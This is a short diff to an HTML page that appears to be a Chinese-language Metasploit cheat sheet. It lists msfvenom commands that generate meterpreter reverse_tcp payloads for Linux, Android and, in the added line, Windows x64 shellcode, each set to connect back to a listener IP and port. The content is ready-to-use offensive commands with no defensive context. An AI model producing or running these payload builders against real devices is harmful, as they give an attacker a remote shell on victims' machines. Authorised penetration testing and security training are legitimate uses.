@@ -230,8 +230,9 @@
 <li>生成Linux payload<br>
 <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.42.0.1 LPORT=23333 -f elf -o ~/Desktop/123.elf</code></li>
 <li>生成Android的payload<br>
-<code>msfvenom -p android/meterpreter/reverse_tcp LHOST=10.42.0.1 LPORT=23333 -o ~/Desktop/1234.apk</code><br>
-生</li>
+<code>msfvenom -p android/meterpreter/reverse_tcp LHOST=10.42.0.1 LPORT=23333 -o ~/Desktop/1234.apk</code></li>
+<li>生成c的payload<br>
+<code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.50.185 -f c &gt; /root/Desktop/payload.txt</code></li>
 </ol>
 </li>
 <li>
